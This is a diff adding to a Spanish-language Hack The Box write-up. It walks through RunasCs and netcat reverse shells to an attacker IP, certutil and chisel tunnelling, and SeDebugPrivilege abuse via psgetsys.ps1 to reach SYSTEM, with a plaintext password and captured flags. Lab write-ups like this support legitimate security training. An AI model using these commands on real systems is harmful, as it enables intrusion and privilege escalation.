@@ -460,62 +460,244 @@ Mode                LastWriteTime         Length Name
 PS C:\Windows\temp\test> 
 
 ```
-Ahora cremos una conexion con RunasCs, nos valemos de la guia .\RunasCs.exe --help para crear una revertshell con el usuario alaading no sin antes escuchar el puerto 443 en nuestro atacante
-```bash
+Ahora cremos una conexion con RunasCs, nos valemos de la guia .\RunasCs.exe --help para crear una revertshell con el usuario alaading no sin antes escuchar el puerto 443 en nuestro atacante y navegamos al escritorio del usuari para capturar la flag
 
-```
 En el servidor
 ```powershell
 .\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.15.14:443
 ```
+en el atacante, y con esto ya migramos al usario alaading
+```bash
+┌─[✗]─[root@htb-juy2vwb9wc]─[/home/outlanderlat]
+└──╼ #rlwrap -cAr nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.15.14] from (UNKNOWN) [10.129.185.102] 49679
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> whoami
+whoami
+pov\alaading
+PS C:\Windows\system32> 
+
+PS C:\users\alaading\Desktop> cat user.txt
+cat user.txt
+b99da8ba25b1b2b54571d8cc16b7581d
+PS C:\users\alaading\Desktop> 
+```
+Ahora debemos de escalar privilegio, nos dimos cuenta que alaadind tiene permisos de acceso remoto por el puerto 5985 podemos exteriorizarlo con [chisel](https://github.com/jpillora/chisel/) descargamos el archivo en el atacante, levantamos el servidor web para descarcarglo al servidor windows.
 
 ```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
-```bash
+┌─[root@htb-juy2vwb9wc]─[/home/outlanderlat/Downloads]
+└──╼ #python3 -m http.server 81
+Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
+10.129.185.102 - - [27/Jun/2024 14:53:04] "GET /chisel.exe HTTP/1.1" 200 -
+10.129.185.102 - - [27/Jun/2024 14:53:04] "GET /chisel.exe HTTP/1.1" 200 -
+
+```
+```powershell
+PS C:\windows\temp\chisel> certutil.exe -f -urlcache -split http://10.10.15.14:81/chisel.exe
+certutil.exe -f -urlcache -split http://10.10.15.14:81/chisel.exe
+****  Online  ****
+  000000  ...
+  896c00
+CertUtil: -URLCache command completed successfully.
+PS C:\windows\temp\chisel> 
+
+```
+Ahora debemos levantarlo en nuestra pc atacante, clonamos el repositorio y generamos el binario con go, comprimimos mas aun el binario
+
 ```bash
 
+┌─[✗]─[root@htb-juy2vwb9wc]─[/home/outlanderlat/Downloads]
+└──╼ #git clone http://github.com/jpillora/chisel
+Cloning into 'chisel'...
+...
+└──╼ #cd chisel/
+└──╼ #go build .
+go: downloading github.com/gorilla/websocket v1.5.0
+...
+└──╼ #du -hc chisel
+12M	chisel
+└──╼ #go build -ldflags "-s -w" .
+└──╼ #du -hc chisel
+8.1M	chisel
+└──╼ #apt install upx
+Reading package lists... Done
+...
+┌─[root@htb-juy2vwb9wc]─[/home/outlanderlat/Downloads/chisel]
+└──╼ #upx chisel 
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2024
+UPX 4.2.2       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 3rd 2024
 
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+   8450048 ->   3387492   40.09%   linux/amd64   chisel                        
+
+Packed 1 file.
+└──╼ #du -hc chisel
+3.3M	chisel
+``` 
+validamos el estado del puerto y esta filtrado, tambien validamos que en nuetros atacente el puero 5985 no se este usando y para accerlo accesible corremos chisel como servidor en el atacante
+```bash
+
+┌─[root@htb-juy2vwb9wc]─[/home/outlanderlat/Downloads/chisel]
+└──╼ #nmap -p 5985 -T5 -v -n 10.129.185.102
+...
+PORT     STATE    SERVICE
+5985/tcp filtered wsman
+
+┌─[✗]─[outlanderlat@htb-juy2vwb9wc]─[~]
+└──╼ $lsof -i:5985
+
+┌─[root@htb-juy2vwb9wc]─[/home/outlanderlat/Downloads/chisel]
+└──╼ #./chisel server --reverse -p 1234
+2024/06/27 15:31:45 server: Reverse tunnelling enabled
+2024/06/27 15:31:45 server: Fingerprint ZLe6tU4ncAEj/JNYPMuWUzIRVldF21+7IBjyquxK+HY=
+2024/06/27 15:31:45 server: Listening on http://0.0.0.0:1234
+#las siguientes lineas parece despues de la conexion establecida..!
+2024/06/27 15:39:04 server: session#1: Client version (1.9.1) differs from server version (0.0.0-src)
+2024/06/27 15:39:04 server: session#1: tun: proxy#R:5985=>5985: Listening
+
+```
+y en el cliete windows server lo iniciamos para aplicar remote port fordwarding de forma que el puerto 5985 de esa maquina se va a convertir en mi puerto 5985 de mi equipo atacante.
+```powershell
+PS C:\windows\temp\chisel> .\chisel.exe client 10.10.15.14:1234 R:5985:127.0.0.1:5985
+.\chisel.exe client 10.10.15.14:1234 R:5985:127.0.0.1:5985
+2024/06/27 13:39:05 client: Connecting to ws://10.10.15.14:1234
+2024/06/27 13:39:05 client: Connected (Latency 16.2764ms)
+
+```
+validamos nuevamente en el puerto en el atacante y vemos que ya esta en modo escucha y para validar usamos evil-winrm y validamos los privilegios de los usuarios.
+
+```bash
+─[✗]─[root@htb-juy2vwb9wc]─[/home/outlanderlat]
+└──╼ #lsof -i:5985
+COMMAND    PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
+chisel  661913 root    8u  IPv6 1586692      0t0  TCP *:5985 (LISTEN)
+
+┌─[root@htb-juy2vwb9wc]─[/home/outlanderlat]
+└──╼ #evil-winrm -i 127.0.0.1 -u 'alaading' -p 'f8gQ8fynP44ek1m3'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\alaading\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeDebugPrivilege              Debug programs                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users\alaading\Documents> 
+```
+Observamos un privilegio SeDebugPrivilege, para saber si podemos aprovechar un privilegio nos vamos a https://book.hacktricks.xyz/ observamos que podemos sincronizarnos o sumarnos a procesos administrativos que esten ejecutandose com permisos nt autority system como winlogon que siempre se ejecuntan como nt autority system podemos inyectar comandos en  memoria que opera a travez de cpid podemos escalar privilegios. vemos la lista de procesos y winlogon.exe tiene el PID 548,.
+
+```bash
+PS C:\Windows\temp\test> tasklist /v
+
+Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title                                                            
+========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================
+System Idle Process              0                            0          8 K Unknown         NT AUTHORITY\SYSTEM                                    47:58:41 N/A                                                                     
+System                           4                            0        156 K Unknown         N/A                                                     0:00:07 N/A                                                                     
+Registry                        88                            0     11,516 K Unknown         N/A                                                     0:00:03 N/A                                                                     
+smss.exe                       288                            0      1,212 K Unknown         N/A                                                     0:00:00 N/A                                                                     
+csrss.exe                      376                            0      5,492 K Unknown         N/A                                                     0:00:00 N/A                                                                     
+wininit.exe                    480                            0      6,952 K Unknown         N/A                                                     0:00:00 N/A                                                                     
+csrss.exe                      488                            1      4,896 K Unknown         N/A                                                     0:00:00 N/A                                                                     
+winlogon.exe                   548                            1     16,244 K Unknown         N/A                                                     0:00:00 N/A                                                                     
+
+PS C:\Windows\temp\test>
+
+```
+Elegimos el scrip tde powershell y lo descargamos luego tenemos que subirlo al Windows
+```bash
+┌─[root@htb-juy2vwb9wc]─[/home/outlanderlat/Downloads]
+└──╼ #wget https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1
+
+```
+Subimos el archivo con evil-winrm lo importamos 
+```powershell
+Evil-WinRM* PS C:\Users\alaading\Documents> upload /home/outlanderlat/Downloads/psgetsys.ps1
+                                        
+Info: Uploading /home/outlanderlat/Downloads/psgetsys.ps1 to C:\Users\alaading\Documents\psgetsys.ps1
+                                        
+Data: 7900 bytes of 7900 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\alaading\Documents> sh
+* Evil-WinRM* PS C:\Users\alaading\Documents> Import-Module .\psgetsys.ps1
+```
+Ahora escuchamos el puerto para ver si recibimos un ping desde el windows
+
+```bash
+┌─[root@htb-juy2vwb9wc]─[/home/outlanderlat/Downloads]
+└──╼ #tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+## estas lineas se observa despues de que se envie el ping
+16:36:22.269570 IP 10.129.185.102 > 10.10.15.14: ICMP echo request, id 1, seq 5, length 40
+16:36:22.269580 IP 10.10.15.14 > 10.129.185.102: ICMP echo reply, id 1, seq 5, length 40
+...
+```
+Entonces validamos si puede ejecutar un comando a traves de otro suario impersonamos enviando un ping el pid de winlogon.exe 548 en este caso
+```bash
+*Evil-WinRM* PS C:\Users\alaading\Documents> ImpersonateFromParentPid -ppid 548 -command "c:\Windows\System32\cmd.exe" -cmdargs "/c ping 10.10.15.14"
+
+```
+este ping deberia estar enviandose como usuario administrador, asi para ganar acceso susbimos netcad al windows, copiamos el archivo a la carpeta en donde se ejecuta chisel
+
+```bash
+┌─[root@htb-juy2vwb9wc]─[/home/outlanderlat/Downloads]
+└──╼ #locate nc.exe
+/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
+┌─[root@htb-juy2vwb9wc]─[/home/outlanderlat/Downloads]
+└──╼ #cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
+
+```
+En windows... subimos el archivo y modificamos los parametros para enviar nc.exe como administrador, no sin antes escuchar el puerto 443 en nuestro atacante
+
+```powershell
+*Evil-WinRM* PS C:\Users\alaading\Documents> upload /home/outlanderlat/Downloads/nc.exe
+                                        
+Info: Uploading /home/outlanderlat/Downloads/nc.exe to C:\Users\alaading\Documents\nc.exe
+                                        
+Data: 37544 bytes of 37544 bytes copied
+                                        
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\alaading\Documents> ImpersonateFromParentPid -ppid 548 -command "c:\Windows\System32\cmd.exe" -cmdargs "/c c:\Users\alaading\Documents\nc.exe -e cmd 10.10.15.14 443"
+
+
+```
+En el atacante, con la shell abierta verificamos que seamos administrador y navegamos hasta la flag
+
+```powershell
+┌─[root@htb-juy2vwb9wc]─[/home/outlanderlat]
+└──╼ #rlwrap -cAr nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.15.14] from (UNKNOWN) [10.129.185.102] 49706
+Microsoft Windows [Version 10.0.17763.5328]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd c:\users\Administrator\Desktop
+cd c:\users\Administrator\Desktop
+
+c:\Users\Administrator\Desktop>type root.txt
+type root.txt
+a3de040569f809e4d0ed89b0b4ac0963
+
+```
